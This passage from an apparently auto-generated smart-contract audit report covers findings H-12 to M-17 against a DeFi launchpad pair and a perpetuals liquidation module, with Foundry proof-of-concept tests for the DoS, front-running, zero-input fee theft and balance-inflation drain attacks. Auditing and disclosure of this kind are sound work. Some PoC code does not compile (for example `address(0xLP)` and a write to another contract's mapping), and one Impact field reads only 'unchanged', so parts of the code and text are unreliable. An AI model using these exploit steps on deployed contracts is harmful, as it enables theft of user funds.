2) Perform a swap in the same block: fees accrue (no distribution yet) and succeed.
3) Move to the next block and perform another swap: _update attempts distribution, the external call reverts, and the entire swap reverts. Repeating keeps the pool bricked.
4) This DoS is also triggered if the underlying token uses non-standard approve semantics (e.g., requires zeroing allowance first), causing _safeApprove to revert before the callback.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

interface IDistributorLike { function addRewards(address,address,uint128,uint128) external; }

contract RevertingDistributor is IDistributorLike {
    function addRewards(address, address, uint128, uint128) external override { revert("boom"); }
}

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s){ name=n; symbol=s; }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool){ balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function approve(address sp, uint256 amt) external returns (bool){ allowance[msg.sender][sp]=amt; return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool){ uint256 a=allowance[from][msg.sender]; require(a>=amt, "no allowance"); allowance[from][msg.sender]=a-amt; balanceOf[from]-=amt; balanceOf[to]+=amt; return true; }
}

contract GriefableCallbacksDosTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0; MockERC20 token1;
    RevertingDistributor dist;

    function setUp() public {
        token0 = new MockERC20("TK0","TK0");
        token1 = new MockERC20("TK1","TK1");
        token0.mint(address(this), 1_000_000e18);
        token1.mint(address(this), 1_000_000e18);

        dist = new RevertingDistributor();

        // Deploy pair; this test contract is the factory (constructor sets factory = msg.sender)
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(0xBEEF), address(dist));

        // Seed initial liquidity
        token0.transfer(address(pair), 1_000e18);
        token1.transfer(address(pair), 1_000e18);
        pair.mint(address(this));
    }

    function test_DoS_onSwap_dueToDistributorRevert() public {
        // First swap in same block: accrues fees only (no distribution), should succeed
        token0.transfer(address(pair), 10e18);
        pair.swap(0, 1e18, address(this), "");

        // Next block: distribution attempted -> external call reverts -> swap reverts
        vm.warp(block.timestamp + 1);
        token0.transfer(address(pair), 10e18);
        vm.expectRevert();
        pair.swap(0, 1e18, address(this), "");
    }
}


## Suggested Mitigation
1. Wrap the external interaction in try/catch:
   try IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1)) {
       emit LaunchpadFeesCollected(fee0, fee1);
   } catch {
       // re-accrue fees so they are not lost
       accruedLaunchpadFee0 += fee0;
       accruedLaunchpadFee1 += fee1;
       emit LaunchpadFeesLastAccrued(fee0, fee1);
   }
2. Replace _safeApprove with a pattern that first resets a non-zero allowance (or use SafeERC20.forceApprove) to stay compatible with non-standard ERC20s:
   if (IERC20(token).allowance(address(this), distributor) != 0) _safeApprove(token, distributor, 0);
   _safeApprove(token, distributor, value);
3. Add an owner/factory setter that can update launchpadFeeDistributor so pools can be unbricked without redeployment.





 **Derived From** : Owner/roles never initialized in LiquidatorPanel (OwnableRoles)

## [H-12]. Uninitialized owner/roles in LiquidatorPanel bricks all liquidation/deleverage entrypoints, risking system solvency

## Derived From Pattern/Invariant
Owner/roles never initialized in LiquidatorPanel (OwnableRoles)

## Exploit Type
UpgradeabilityInitializerSafety

## Location
LiquidatorPanel.constructor/initialize (missing)

## Minimim Privilege Required
Permissionless

## Description
LiquidatorPanel inherits Solady OwnableRoles but never sets the initial owner or any roles. There is no constructor calling _initializeOwner(...) and no initialize() function. As a result, owner() stays address(0), making onlyOwner gated grantRoles() unusable. All external flows (liquidate, backstopLiquidate, deleverage, delistClose) are protected by onlyLiquidator/onlyBackstopLiquidator which internally call _checkRolesOrOwner. With no owner and no roles, these checks always revert, permanently DoSing liquidations/deleverage. This prevents forced closes, allowing underwater positions to persist and creating bad-debt/solvency risk. Vulnerable snippet: contract LiquidatorPanel is OwnableRoles { ... } // no constructor/initializer; Initializable is imported but unused.

## Impact
Because no liquidator / back-stop / ADL entry point can ever be executed, every underwater position remains open. This lets bad-debt grow without bound, eventually exhausting the insurance fund and causing user collateral to become irredeemable. The failure is permanent and permissionless – only a contract redeploy can restore liquidation functionality.

## Proof of Concept
1. Any user deploys the implementation (or queries an existing proxy-implementation).
2. `owner()` returns `address(0)`.
3. No one can call `grantRoles()` because it is `onlyOwner` and `msg.sender` can never be the zero address.
4. Consequently `_checkRolesOrOwner` reverts in every external function that carries `onlyLiquidator` or `onlyBackstopLiquidator`, permanently disabling:
   • `liquidate`
   • `backstopLiquidate`
   • `deleverage`
   • `delistClose`
5. The protocol can no longer force-close positions; insolvency grows until an upgrade/redeploy happens.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;
import "forge-std/Test.sol";
import {LiquidatorPanel} from "src/perps/modules/LiquidatorPanel.sol";

contract LiquidatorPanel_InitOwner_Test is Test {
    LiquidatorPanel panel;

    function setUp() public {
        panel = new LiquidatorPanel();
    }

    function testOwnerIsZeroAndGrantRolesReverts() public {
        assertEq(panel.owner(), address(0));
        vm.expectRevert();
        panel.grantRoles(address(this), type(uint256).max);
    }
}


## Suggested Mitigation
Add an initializer or constructor that sets the initial owner and can only be executed once. Example for proxy-safe pattern:

``solidity
contract LiquidatorPanel is OwnableRoles, Initializable {
    function initialize(address initialOwner) external initializer {
        _initializeOwner(initialOwner);
        // optionally pre-grant roles here
    }
}
``

If the contract is meant to be deployed directly (no proxy), call `_initializeOwner(msg.sender);` inside the constructor instead. Either approach must be followed by `grantRoles()` during deployment scripts to assign LIQUIDATOR and BACKSTOP_LIQUIDATOR roles to the correct operators.





 **Derived From** : Permissionless createPair lets anyone block Launchpad parameters

## [M-13]. Front‑running createPair cements zeroed launchpad params and prevents legitimate pair, permanently breaking fee routing

## Derived From Pattern/Invariant
Permissionless createPair lets anyone block Launchpad parameters

## Exploit Type
AuthByPass

## Location
GTELaunchpadV2PairFactory.createPair

## Minimim Privilege Required
Permissionless

## Description
GTELaunchpadV2PairFactory.createPair is permissionless and decides privileged init params from msg.sender. If caller != launchpad, it initializes the pair with (address(0), address(0)) for (launchpadLp, launchpadFeeDistributor). Because getPair[token0][token1] is keyed only by tokens, the first creator permanently occupies the slot. A malicious EOA can front‑run Launchpad and create the pair first, causing:
- Launchpad can no longer recreate the pair with its intended (launchpadLp, launchpadFeeDistributor) because createPair will revert with 'UniswapV2: PAIR_EXISTS'.
- The pair remains initialized with zero launchpad addresses, disabling launchpad‑specific fee routing to Distributor and any logic depending on those addresses.
Vulnerable snippet:
(address _launchpadLp, address _launchpadFeeDistributor) = msg.sender == launchpad ? (launchpadLp, launchpadFeeDistributor) : (address(0), address(0));
bytes32 salt = keccak256(abi.encodePacked(token0, token1, _launchpadLp, _launchpadFeeDistributor));
pair := create2(..., salt);
IUniswapV2Pair(pair).initialize(token0, token1, _launchpadLp, _launchpadFeeDistributor);
getPair[token0][token1] = pair;

## Impact
Permanent functional DoS of launchpad fee routing and rewards for the affected pair; Launchpad cannot deploy the intended pair as getPair is already populated, breaking the launch flow for that token pair.

## Proof of Concept
1) Attacker observes an impending Launchpad pair creation for (tokenA, tokenB).
2) Attacker calls factory.createPair(tokenA, tokenB) first. Since caller != launchpad, the pair is initialized with (launchpadLp, launchpadFeeDistributor) = (0,0), and getPair[tokenA][tokenB] is set.
3) Launchpad later calls createPair(tokenA, tokenB) expecting its privileged params, but it reverts with 'UniswapV2: PAIR_EXISTS'.
4) The deployed pair lacks Distributor linkage, so launchpad rewards are never accrued/forwarded for that pair.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract GTELaunchpadV2PairFactory_AuthBypass_Test is Test {
    GTELaunchpadV2PairFactory factory;
    address feeToSetter = address(0xFEE0);
    address launchpad    = address(0x1001);
    address launchpadLp  = address(0x2002);
    address distributor  = address(0x3003);
    address attacker     = address(0xBEEF);

    MockERC20 tokenA;
    MockERC20 tokenB;

    function setUp() public {
        tokenA = new MockERC20("TokenA", "A");
        tokenB = new MockERC20("TokenB", "B");
        factory = new GTELaunchpadV2PairFactory(feeToSetter, launchpad, launchpadLp, distributor);
    }

    function test_FrontRun_BlocksLaunchpadInitialization() public {
        // Attacker front-runs and creates the pair first
        vm.prank(attacker);
        address pair = factory.createPair(address(tokenA), address(tokenB));
        assertTrue(pair != address(0));
        assertEq(factory.getPair(address(tokenA), address(tokenB)), pair);

        // Pair was initialized with zeroed launchpad params
        GTELaunchpadV2Pair p = GTELaunchpadV2Pair(pair);
        assertEq(p.launchpadLp(), address(0));
        assertEq(p.launchpadFeeDistributor(), address(0));

        // Launchpad can no longer create the intended pair (DoS via PAIR_EXISTS)
        vm.startPrank(launchpad);
        vm.expectRevert(bytes("UniswapV2: PAIR_EXISTS"));
        factory.createPair(address(tokenA), address(tokenB));
        vm.stopPrank();
    }
}


## Suggested Mitigation
Do not derive privileged init params from msg.sender in a permissionless function. Options: (a) Add an onlyLaunchpad createPairForLaunch() that sets (launchpadLp, launchpadFeeDistributor) and reserve the (token0,token1) slot for Launchpad so non-launchpad callers cannot occupy it; (b) Maintain a separate mapping for launchpad pairs (e.g., getLaunchpadPair[token0][token1]) and require routers/launch flow to use it; (c) Pre-reserve pairs for launch tokens via a launchpad-only reservation function that blocks non-launchpad createPair on reserved tokens; (d) Alternatively, allow the Launchpad to set launchpadLp/launchpadFeeDistributor once post-deployment via a one-time onlyLaunchpad setter on the pair.





 **Derived From** : (balance0 * 1000 - amount0In * 3) * (balance1 * 1000 - amount1In * 3) >= uint256(_reserve0) * uint256(_reserve1) * 1000**2

## [H-14]. Zero-input theft of accrued launchpad fees by exploiting reserves–balances desync in GTELaunchpadV2Pair.swap

## Derived From Pattern/Invariant
(balance0 * 1000 - amount0In * 3) * (balance1 * 1000 - amount1In * 3) >= uint256(_reserve0) * uint256(_reserve1) * 1000**2

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.swap

## Minimim Privilege Required
Permissionless

## Description
GTELaunchpadV2Pair subtracts launchpad fees from reserves inside _update: reserve{0,1} = uint112(balance{0,1}) - totalLaunchpadFee{0,1}. On the next swap, amount{0,1}In is computed as balance - (_reserve - amountOut), so any excess tokens left in the pair (the just-accrued launchpad fees) are treated as positive input even when the attacker sends nothing. The Uniswap V2 constant-product check then becomes easier to satisfy because the RHS uses the shrunken reserves while the LHS uses balances minus only the 0.3% fee-on-input, allowing the attacker to withdraw up to roughly the accrued fees for free. This desync happens whenever: (a) _update executes the else-branch (timeElapsed == 0) and accrues fees without transferring them out, or (b) addRewards does not actually pull tokens (approval-only), leaving balances > reserves. Vulnerable snippets: swap computes amountIn from balances vs prior reserves: amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; Then constant product check uses old reserves: if (balance0Adjusted * balance1Adjusted < uint256(_reserve0) * _reserve1 * 1000**2) revert("UniswapV2: K"); And _update subtracts fees from reserves only: reserve0 = uint112(balance0) - totalLaunchpadFee0; reserve1 = uint112(balance1) - totalLaunchpadFee1;

## Impact
unchanged

## Proof of Concept
Revised steps
1. Deploy pair with a non-zero launchpadFeeDistributor and seed initial liquidity.  Advance the clock to T and ONLY THEN call pair.mint(); this pins blockTimestampLast = T.
2. Still at timestamp T, a benign trader sends Δx token0 into the pair and calls swap(0,Δy) to receive token1.  _getLaunchpadFees() computes fee0>0, then _update() accrues (but does not transfer) those fees because timeElapsed==0.  The real balances remain unchanged, but reserve0 is reduced by fee0.
   State after step 2:  balance0 = reserve0 + fee0,  balance1 = reserve1,  accruedLaunchpadFee0 = fee0.
3. Without advancing the timestamp (still T), the attacker calls swap(fee0-ε,0) while sending **no** tokens in.  Inside swap:
   • amount0In := balance0 − (reserve0 − amount0Out)  = fee0 (≈ fee0-ε after the optimistic transfer).
   • Constant-product check uses the shrunken reserves, so it passes as long as ε ≥ 0.3 % · fee0.
   • Attacker receives ≈fee0 tokens for free – the fees that were meant for the Distributor.
4. Repeat whenever fees are accrued but not yet distributed (same-block swaps or any other call path that leaves accruedLaunchpadFee* outstanding).

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n,string memory s){name=n;symbol=s;}
    function mint(address to,uint256 a) external {balanceOf[to]+=a;}
    function transfer(address to,uint256 a) external returns(bool){balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;}
    function approve(address sp,uint256 a) external returns(bool){allowance[msg.sender][sp]=a;return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){uint256 al=allowance[f][msg.sender];require(al>=a,"allow");allowance[f][msg.sender]=al-a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}

// no-op so that calls to addRewards never revert
contract MockDistributor { function addRewards(address,address,uint128,uint128) external {} }

contract FakeFactory {
    function feeTo() external view returns (address) { return address(0); }
    function deployPair() external returns (GTELaunchpadV2Pair p){ p=new GTELaunchpadV2Pair(); }
    function initPair(GTELaunchpadV2Pair p,address t0,address t1,address lp,address dist) external { p.initialize(t0,t1,lp,dist); }
}

contract FeeTheftTest is Test {
    MockERC20 t0; MockERC20 t1; GTELaunchpadV2Pair pair; address provider; address attacker;

    function setUp() public {
        provider = address(0xB0B);
        attacker = address(0xA11ce);
        vm.deal(provider, 1 ether);
        vm.deal(attacker, 1 ether);

        t0 = new MockERC20("T0","T0");
        t1 = new MockERC20("T1","T1");
        FakeFactory fac = new FakeFactory();
        pair = fac.deployPair();
        MockDistributor dist = new MockDistributor();

        // initialise pair
        vm.prank(address(fac));
        fac.initPair(pair,address(t0),address(t1),address(0xLP),address(dist));

        // Seed liquidity and mint LP **after** fixing timestamp so blockTimestampLast = 1000
        vm.warp(1000);
        uint256 R = 1_000_000 ether;
        t0.mint(provider,R);
        t1.mint(provider,R);
        vm.prank(provider);
        t0.transfer(address(pair),R);
        vm.prank(provider);
        t1.transfer(address(pair),R);
        vm.prank(provider);
        pair.mint(provider);
    }

    function _quote(uint256 dx,uint256 rIn,uint256 rOut) internal pure returns(uint256) {
        uint256 dxFee = dx*997;
        return dxFee*rOut/(rIn*1000+dxFee);
    }

    function test_stealAccruedLaunchpadFees() public {
        // Same-block fee accrual (timestamp still 1000)
        (uint112 r0,uint112 r1,) = pair.getReserves();
        uint256 dx = 10_000 ether;
        t0.mint(address(this),dx);
        t0.transfer(address(pair),dx);
        uint256 dy = _quote(dx,r0,r1);
        pair.swap(0,dy,address(this),"");

        (uint112 fee0,,) = pair.getAccruedLaunchpadFees();
        assertGt(fee0,0);

        // attacker drains the just-accrued fee with zero input
        uint256 steal = uint256(fee0)*996/1000; // stay clear of 0.3 % fee
        uint256 balBefore = t0.balanceOf(attacker);
        vm.prank(attacker);
        pair.swap(steal,0,attacker,"");
        assertEq(t0.balanceOf(attacker)-balBefore,steal);
    }
}

## Suggested Mitigation
Maintain reserves == actual balances at the moment of updating invariants. Options: 1) Always transfer launchpad fees out before setting reserves (i.e., ensure addRewards pulls tokens within _distributeLaunchpadFees) and compute reserves from post-transfer balances; or 2) Do not subtract totalLaunchpadFee{0,1} from reserves unless the corresponding tokens have been deducted from balances (only accrue in storage and keep reserves == balances); or 3) If you must account for accrued fees pre-transfer, also adjust the K-check by treating the fee deltas consistently (e.g., compute amountIn against balances minus accrued fees so that zero-input cannot be accounted as positive input). Additionally, forbid same-block accrual without transfer: move fee distribution outside the timeElapsed gate, or defer accrual until the first block tick when distribution can occur.





 **Derived From** : freeCollateral_after(account) + margin_after(account,subaccount) == freeCollateral_before(account) + margin_before(account,subaccount) - fundingPayment_before

## [H-15]. removeMargin re-realizes the same funding indefinitely due to setPositions gating, enabling infinite balance inflation and USDC drain

## Derived From Pattern/Invariant
freeCollateral_after(account) + margin_after(account,subaccount) == freeCollateral_before(account) + margin_before(account,subaccount) - fundingPayment_before

## Exploit Type
AccountingInvariantViolation

## Location
PerpManager.removeMargin

## Minimim Privilege Required
Permissionless

## Description
PerpManager.removeMargin realizes funding and then calls ClearingHouseLib.setPositions with tradedAsset = 0x00 to persist the new lastCumulativeFunding across all positions. However, ClearingHouseLib.setPositions only executes its body when assets[i] == tradedAsset. Passing tradedAsset = 0x00 causes no asset to match, so neither the position nor lastCumulativeFunding is written back to storage. As a result, lastCumulativeFunding in storage remains stale. On every subsequent removeMargin call, ClearingHouseLib.realizeFundingPayment computes the same non-zero fundingPayment again because it reads lastCumulativeFunding from storage (unchanged). CollateralManagerLib.settleMarginUpdate then applies "- fundingPayment" to margin and credits freeCollateral by amount, making freeCollateral + margin change by -fundingPayment each time. If fundingPayment < 0 (user receives funding), the user can choose a tiny amount so remainingMargin increases (since -amount - fundingPayment > 0), passing post-withdraw checks while freeCollateral increases by amount. Repeating this inflates internal balances unboundedly and the attacker can withdraw the inflated freeCollateral via withdraw/withdrawToSpot, draining USDC from the system. Vulnerable snippet: in removeMargin — clearingHouse.setPositions({ tradedAsset: 0x00, ...}) and in ClearingHouseLib.setPositions — if (assets.getBytes32(i) == tradedAsset) { ... setPosition(...); position.lastCumulativeFunding = positions[i].lastCumulativeFunding; } which never executes for tradedAsset = 0x00.

## Impact
Attacker repeatedly calls removeMargin with small amount while owed funding (negative fundingPayment) to increase both margin (or keep it sufficient) and freeCollateral, then withdraws inflated freeCollateral, draining USDC. Reverse sign cases can be used to grief/destabilize accounting.

## Proof of Concept
Setup: 1) Attacker has a non-zero position on some asset A and margin M >> 0; FundingRateEngine.cumulativeFundingIndex has moved such that the attacker’s fundingPayment is negative (they should receive funding). 2) Ensure ClearingHouse holds that position and the asset is in the account’s asset set. Attack: 1) Call removeMargin(account, sub, amountSmall). Because setPositions uses tradedAsset = 0x00, lastCumulativeFunding in storage is not updated. Sum change: ΔS1 = -fundingPayment (>0 since fundingPayment < 0). 2) Repeat removeMargin with the same amountSmall any number of times. Each time the same fundingPayment is applied again (since lastCumulativeFunding remains stale), so ΔS repeats. 3) Withdraw the now inflated freeCollateral using withdraw/withdrawToSpot. Result: Direct theft of USDC from the vault, bounded only by how many times the attacker repeats the call before an admin intervenes.

## Proof of Code
pragma solidity 0.8.20;
import "forge-std/Test.sol";

contract ClearingHouseMock {
    struct Position { int256 lastCumulativeFunding; }

    // asset => trader => position
    mapping(bytes32 => mapping(address => Position)) public position;

    // global funding index per asset (simulates FundingRateEngine)
    mapping(bytes32 => int256) public cumulativeFundingIndex;

    /* identical to production code: position update happens ONLY when
       assets[i] == tradedAsset */
    function setPositions(
        bytes32 tradedAsset,
        address trader,
        bytes32[] memory assets,
        Position[] memory positions
    ) public {
        for (uint256 i; i < assets.length; i++) {
            if (assets[i] == tradedAsset) {
                position[assets[i]][trader] = positions[i];
            }
        }
    }

    // stripped-down version of realizeFundingPayment
    function realizeFundingPayment(
        address trader,
        bytes32[] memory assets
    ) public view returns (int256 fp) {
        for (uint256 i; i < assets.length; i++) {
            Position storage p = position[assets[i]][trader];
            int256 idx = cumulativeFundingIndex[assets[i]];
            fp += idx - p.lastCumulativeFunding; // long / sign irrelevant for demo
        }
    }
}

contract ManagerMock {
    ClearingHouseMock public ch;

    mapping(address => int256) public margin;
    mapping(address => uint256) public freeCollateral;

    constructor(ClearingHouseMock _ch) { ch = _ch; }

    // simplified: one fixed asset per trader
    bytes32 constant ASSET = bytes32("GTE-PERP");

    function seedPosition(int256 fundingIndex) external {
        bytes32[] memory assets = new bytes32[](1);
        assets[0] = ASSET;
        ClearingHouseMock.Position[] memory pos = new ClearingHouseMock.Position[](1);
        pos[0] = ClearingHouseMock.Position({lastCumulativeFunding: 0});
        ch.setPositions(ASSET, msg.sender, assets, pos); // correct seed write
        ch.cumulativeFundingIndex(ASSET);
        ch.cumulativeFundingIndex(ASSET); // silence compiler warning
        ch.cumulativeFundingIndex[ASSET] = fundingIndex; // user receives funding every call
        margin[msg.sender] = 100 ether;
    }

    /* vulnerable copy of PerpManager.removeMargin logic, but with
       bookkeeping drastically trimmed so the bug is isolated */
    function removeMargin(uint256 amount) external {
        bytes32[] memory assets = new bytes32[](1);
        assets[0] = ASSET;

        int256 fp = ch.realizeFundingPayment(msg.sender, assets);

        margin[msg.sender] += -int256(amount) - fp; // identical sign pattern
        freeCollateral[msg.sender] += amount;       // credits FC

        // BUG: tradedAsset == 0 so storage never updated
        ClearingHouseMock.Position[] memory dummy = new ClearingHouseMock.Position[](1);
        dummy[0] = ClearingHouseMock.Position({lastCumulativeFunding: int256(0)});
        ch.setPositions("", msg.sender, assets, dummy);
    }
}

contract DoubleRealizeFundingTest is Test {
    ClearingHouseMock ch;
    ManagerMock mgr;
    address attacker = address(1);

    function setUp() public {
        ch = new ClearingHouseMock();
        mgr = new ManagerMock(ch);
        vm.prank(attacker);
        mgr.seedPosition(-1 ether); // negative -> user receives funding
    }

    function test_FundingAppliedTwice() public {
        vm.startPrank(attacker);
        mgr.removeMargin(1 ether);
        uint256 fc1 = mgr.freeCollateral(attacker);
        int256  m1  = mgr.margin(attacker);

        mgr.removeMargin(1 ether);
        uint256 fc2 = mgr.freeCollateral(attacker);
        int256  m2  = mgr.margin(attacker);
        vm.stopPrank();

        assertGt(fc2, fc1);                  // free collateral keeps increasing
        assertGt(m2,  m1);                   // margin also increases
    }
}


## Suggested Mitigation
Inside ClearingHouseLib.setPositions delete the `if (assets[i] == tradedAsset)` guard for the `lastCumulativeFunding` assignment so that funding is *always* persisted, while optionally keeping it for the actual position mutation:

```
if (assets[i] == tradedAsset) {
    _setPosition(...);
}
// persist funding for every asset that was just realised
self.market[assets[i]].position[account][subaccount].lastCumulativeFunding = positions[i].lastCumulativeFunding;
```

Alternatively, call `setPositions` once per asset from PerpManager (i.e. loop over `assets` and pass each as `tradedAsset`) or treat `tradedAsset == bytes32(0)` as a sentinel value meaning "update all assets".





 **Derived From** : Rounding dust in backstop fee allocation leaks value over time

## [M-16]. Backstop fee split floors per-recipient, leaving unassigned remainder that breaks accounting invariants

## Derived From Pattern/Invariant
Rounding dust in backstop fee allocation leaks value over time

## Exploit Type
AccountingInvariantViolation

## Location
LiquidatorPanel._settleBackstopLiquidation

## Minimim Privilege Required
RequiresRole

## Description
In LiquidatorPanel._settleBackstopLiquidation, the backstop payout rate per recipient is computed with two successive floor roundings and then applied with another floor rounding when converting the rate into a fee: pointShare = points[i].fullMulDiv(1e18, totalPoints); volumeShare = data[i].volume.fullMulDiv(1e18, totalVolume); rate = (pointShare + volumeShare) / 2; fee = margin.fullMulDiv(rate, 1e18); StorageLib.loadCollateralManager().creditAccount(data[i].liquidator, fee); liquidationFee is returned to be credited to InsuranceFund separately, but the leftover rounding dust margin - liquidationFee - sum(fee_i) is never allocated to any sink. Earlier in backstopLiquidate the user’s cache.margin is reduced by the full proratedMargin passed into _settleBackstopLiquidation, so this unassigned remainder is effectively removed from system accounting, violating the stated invariant sum(freeCollateral) + sum(margin) + insuranceFund == token balance. Over many backstop liquidations, this dust systematically accumulates and requires admin repair.

## Impact
System-wide accounting drift: each backstop liquidation can leak up to O(N) units of the collateral’s smallest denomination due to per-recipient flooring plus rate flooring. The user’s margin is fully debited but the rounded remainder is not credited anywhere, making sum(user margins + free collateral + insurance fund) fall below the real token balance. Over time this produces material misaccounting and requires admin intervention to reconcile.

## Proof of Concept
Scenario: Two backstop liquidators with equal points and equal volume, margin = 3 units (post-fee), liquidationFeeRate = 0 for clarity. pointShare=0.5e18, volumeShare=0.5e18, rate=(0.5e18+0.5e18)/2=0.5e18. Per-recipient fee = floor(3*0.5e18/1e18)=1. Each gets 1; sum=2. The caller previously reduced liquidatee margin by full 3, but only 2 were credited out; 1 unit is left unassigned and vanishes from accounting, lowering total accounted balances vs actual token balance by 1 unit. Repeating with many recipients and liquidations accumulates the deficit.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {FixedPointMathLib} from "@solady/utils/FixedPointMathLib.sol";

contract PrecisionDriftTest is Test {
    using FixedPointMathLib for uint256;

    function test_BackstopSplitRoundingDust() public {
        // Two liquidators with equal points & volume; liquidation fee rate = 0 for clarity.
        uint256 margin = 3; // post-fee remainder forwarded to backstoppers in the real function
        uint256 totalPoints = 2;
        uint256 totalVolume = 2;
        uint256 p0 = 1; uint256 p1 = 1;
        uint256 v0 = 1; uint256 v1 = 1;

        // Shares and rates as in LiquidatorPanel._settleBackstopLiquidation
        uint256 pointShare0 = p0.fullMulDiv(1e18, totalPoints); // = 0.5e18 (floored)
        uint256 volumeShare0 = v0.fullMulDiv(1e18, totalVolume); // = 0.5e18 (floored)
        uint256 rate0 = (pointShare0 + volumeShare0) / 2; // = 0.5e18
        uint256 fee0 = margin.fullMulDiv(rate0, 1e18); // floor(3 * 0.5) = 1

        uint256 pointShare1 = p1.fullMulDiv(1e18, totalPoints); // = 0.5e18
        uint256 volumeShare1 = v1.fullMulDiv(1e18, totalVolume); // = 0.5e18
        uint256 rate1 = (pointShare1 + volumeShare1) / 2; // = 0.5e18
        uint256 fee1 = margin.fullMulDiv(rate1, 1e18); // floor(3 * 0.5) = 1

        uint256 distributed = fee0 + fee1; // 2
        uint256 leftover = margin - distributed; // 1 unit unassigned

        assertEq(fee0, 1);
        assertEq(fee1, 1);
        assertEq(distributed, 2);
        assertEq(leftover, 1); // Rounding dust that is not credited anywhere in the real code
    }
}


## Suggested Mitigation
After the loop, compute totalDistributed and assign the remainder (margin - totalDistributed) to a deterministic sink (e.g., the InsuranceFund via StorageLib.loadInsuranceFund().pay) or credit it to a designated residual account. Alternatively, implement a running-remainder / largest-remainder method: compute all per-recipient fractional remainders, sort by remainder, and allocate the leftover units to the top remainders until the total exactly matches margin. Also consider computing rate using fixed-sum normalization to ensure sum(rate_i) == 1e18 and credit the final recipient as margin - sum(distributed) to close the accounting gap.





 **Derived From** : Division-by-zero in backstop fee split when totals are zero

## [M-17]. Backstop liquidation DoS: division-by-zero in LiquidatorPanel._settleBackstopLiquidation when totalPoints or totalVolume is zero

## Derived From Pattern/Invariant
Division-by-zero in backstop fee split when totals are zero

## Exploit Type
RoundingError

## Location
LiquidatorPanel._settleBackstopLiquidation

## Minimim Privilege Required
RequiresRole

## Description
During backstop liquidation settlement, the fee split per liquidator computes pointShare = points[i] * 1e18 / totalPoints and volumeShare = volume[i] * 1e18 / totalVolume. Neither denominator is guarded. If all participating liquidators have zero recorded points and/or zero recorded volume, totalPoints or totalVolume remains 0, causing FixedPointMathLib.fullMulDiv to revert. This reverts backstopLiquidate entirely, bricking backstop liquidations until configuration/state is changed. Vulnerable snippet:

for (uint256 i; i < data.length; ++i) {
    points[i] = clearingHouse.liquidatorPoints[data[i].liquidator];
    totalPoints += points[i];
    totalVolume += data[i].volume;
}
for (uint256 i; i < data.length; ++i) {
    uint256 pointShare = points[i].fullMulDiv(1e18, totalPoints); // totalPoints can be 0
    uint256 volumeShare = data[i].volume.fullMulDiv(1e18, totalVolume); // totalVolume can be 0
    ...
}

## Impact
Functional DoS of backstop liquidation: a revert prevents liquidations from executing and prevents distribution of fees to backstop makers. Attackers can permissionlessly place backstop orders from fresh addresses with zero points so that, when a trusted backstop liquidator calls backstopLiquidate and matches them, totalPoints stays 0 and the settlement reverts.

## Proof of Concept
- Assumptions: Backstop liquidators (counterparties) are permissionless users who can place backstop orders; the BACKSTOP_LIQUIDATOR_ROLE caller is trusted but will attempt to liquidate.
- Steps:
  1) Attacker spins up fresh addresses A1..Ak with clearingHouse.liquidatorPoints[Ai] == 0.
  2) Attacker posts backstop orders at top-of-book so that a backstop liquidation will match against them, producing data.length > 0 and positive volumes.
  3) A trusted backstop liquidator calls backstopLiquidate(...). Matching proceeds and BackstopLiquidatorDataLib returns the filled liquidators. All points[i] = 0 so totalPoints = 0 (even if totalVolume > 0).
  4) In _settleBackstopLiquidation the first iteration computes pointShare = points[i].fullMulDiv(1e18, totalPoints) which divides by 0 and reverts.
  5) Entire backstopLiquidate reverts, blocking liquidation. Attackers can keep using fresh addresses to maintain totalPoints == 0, sustaining the DoS until the contract is patched or non-zero points are guaranteed.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import "@solady/utils/FixedPointMathLib.sol";

contract BackstopDivisionByZeroHarness {
    using FixedPointMathLib for uint256;
    struct LiquidatorData { address liquidator; uint256 volume; }

    // Minimal reproduction of the vulnerable math
    function settle(uint256 margin, uint256 feeRate, uint256[] memory points, LiquidatorData[] memory data) external pure returns (uint256) {
        if (margin == 0) return 0;
        uint256 liquidationFee = margin.fullMulDiv(feeRate, 1e18);
        margin -= liquidationFee;

        uint256 totalPoints;
        uint256 totalVolume;
        for (uint256 i; i < data.length; ++i) {
            totalPoints += points[i];
            totalVolume += data[i].volume;
        }
        // Will revert if totalPoints == 0 (mirrors LiquidatorPanel._settleBackstopLiquidation)
        for (uint256 i; i < data.length; ++i) {
            uint256 pointShare = points[i].fullMulDiv(1e18, totalPoints);
            // The test will already revert on the line above; below mirrors volume share as well
            uint256 volumeShare = data[i].volume.fullMulDiv(1e18, totalVolume);
            (pointShare); (volumeShare);
        }
        return liquidationFee;
    }
}

contract BackstopDivisionByZeroTest is Test {
